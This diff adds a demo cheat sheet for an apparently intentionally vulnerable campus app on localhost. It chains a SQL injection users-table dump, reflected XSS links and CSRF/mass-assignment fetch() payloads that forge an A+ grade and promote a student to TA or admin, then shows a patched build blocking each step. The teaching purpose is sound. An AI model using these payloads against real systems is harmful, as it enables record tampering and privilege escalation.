@@ -1,0 +1,127 @@
+═══════════════════════════════════════════════════════════════════════
+   CampusPulse-Shield  ·  Live Demo Cheat Sheet
+   Attacker:  Negm   (student,  user_id = 4)
+   Victim:    Dairo  (admin)
+═══════════════════════════════════════════════════════════════════════
+
+GOALS
+  (1)  Get Negm a fake A+ in Computer Networks (ECE330, course_id = 7)
+  (2)  Promote Negm from student → TA
+
+
+══════════════════════════════════════════════════════════════════════
+ STAGE 1   —   SQL  INJECTION   (reconnaissance)
+══════════════════════════════════════════════════════════════════════
+
+  Paste this into the search bar as Negm — leaks the users table with their IDs visible:
+
+UNION SELECT id, username, email, role, 1 FROM users-- 
+
+  Information Negm reads off :
+      • his own user_id            = 4
+      • Dairo (admin)              = user_id 1
+      • Computer Networks (ECE330) = course_id 7
+      • Web App Security (CSC401)  = course_id 4
+
+
+══════════════════════════════════════════════════════════════════════
+ GOAL #1   —   Fake A+ in Computer Networks
+══════════════════════════════════════════════════════════════════════
+
+ ── STAGE 2 : REFLECTED XSS   (delivery — via announcements feed) ──
+
+   Negm goes to  /announcements  →  + New post.
+   Body:  "The admin updated the schedule. Click for new dates."
+   Link URL  (the XSS payload — it's the part AFTER `?q=`) :
+
+http://localhost:5000/search?q=<script>...</script>
+                              └────────┬────────┘
+                              this drops raw into the page
+                              because the template renders   {{ q|safe }}
+
+   Negm publishes it. The bait sits in the feed waiting for an admin
+   to click.
+
+ ── STAGE 3 : CSRF (what the script does) ──
+
+   The body of the <script> tag is the CSRF payload. It runs INSIDE
+   the admin's logged-in browser, so the admin's session cookie
+   travels with the request automatically (credentials:'include').
+
+   The fetch() inside the script:
+
+       fetch('/courses/7/grade',                  ← the target endpoint
+             {method:'POST', credentials:'include',
+              body: new URLSearchParams({
+                       student_id: 4,             ← Negm  (from SQLi)
+                       grade: 'A+'                ← the desired grade
+                    })})
+
+   Endpoint has NO CSRF token check  →  server happily writes the row.
+
+ ── PUT IT ALL TOGETHER  —  the Link URL to paste in the announcement ──
+
+http://localhost:5000/search?q=<script>fetch('/courses/7/grade',{method:'POST',credentials:'include',body:new URLSearchParams({student_id:4,grade:'A+'})})</script>
+
+ ── DELIVERY  (the chain firing) ──
+
+   1.  log in as  Dairo
+   2.  Open  /announcements  →  click Negm's post.
+   3.  Browser navigates to  /search?q=<script>…</script>
+       →  XSS fires  →  fetch sends POST  →  302 OK.
+   4.  Switch back to Negm  →  /my-grades
+       →  ECE330 shows  A+  ·  GPA  3.53 → 3.67.
+
+
+══════════════════════════════════════════════════════════════════════
+ GOAL #2   —   Promote Negm from student to TA
+══════════════════════════════════════════════════════════════════════
+
+ ── STAGE 2 : REFLECTED XSS   (delivery) ──
+
+   Same idea — Negm posts another announcement. The XSS sink is again
+   the search bar; the wrapper of the URL stays the same:
+
+http://localhost:5000/search?q=<script>...</script>
+
+ ── STAGE 3 : CSRF + MASS-ASSIGNMENT   (what the script does) ──
+
+       fetch('/admin/users/set-role',             ← the target endpoint
+             {method:'POST', credentials:'include',
+              body: new URLSearchParams({
+                       target_id:   4,            ← Negm
+                       target_role: 'ta'          ← any role string!
+                    })})
+
+
+ ── PUT IT ALL TOGETHER  —  the Link URL to paste in the announcement ──
+
+http://localhost:5000/search?q=<script>fetch('/admin/users/set-role',{method:'POST',credentials:'include',body:new URLSearchParams({target_id:4,target_role:'ta'})})</script>
+
+ ── DELIVERY ──
+
+   1.  Dairo (still logged in) clicks Negm's second post.
+   2.  Refresh Negm's  /dashboard  →  sidebar now shows  🧑‍🏫 TA  badge,
+       Management section (Students) becomes visible.
+
+   ⚡ TO ESCALATE ALL THE WAY TO ADMIN INSTEAD OF TA:
+        change   target_role:'ta'   →   target_role:'admin'
+        — the endpoint has no whitelist, so 'admin' is accepted.
+
+
+══════════════════════════════════════════════════════════════════════
+ SAME STEPS ON THE GREEN BUILD   (http://localhost:5001)
+══════════════════════════════════════════════════════════════════════
+
+  Stage 1 SQLi   →  no rows leaked  (parameterized query)
+  Stage 2 XSS    →  &lt;script&gt; printed as text — no execution
+  Stage 3 CSRF   →  HTTP 400 from middleware  (token missing)
+  Stage 3 role   →  whitelist refuses any role outside {student, ta}
+
+  Negm's grade stays unchanged.  Negm's role stays "student".
+  Same chain, every link broken.
+
+
+═══════════════════════════════════════════════════════════════════════
+   END  —  Break it on purpose. Patch it on principle.  🛡️
+═══════════════════════════════════════════════════════════════════════
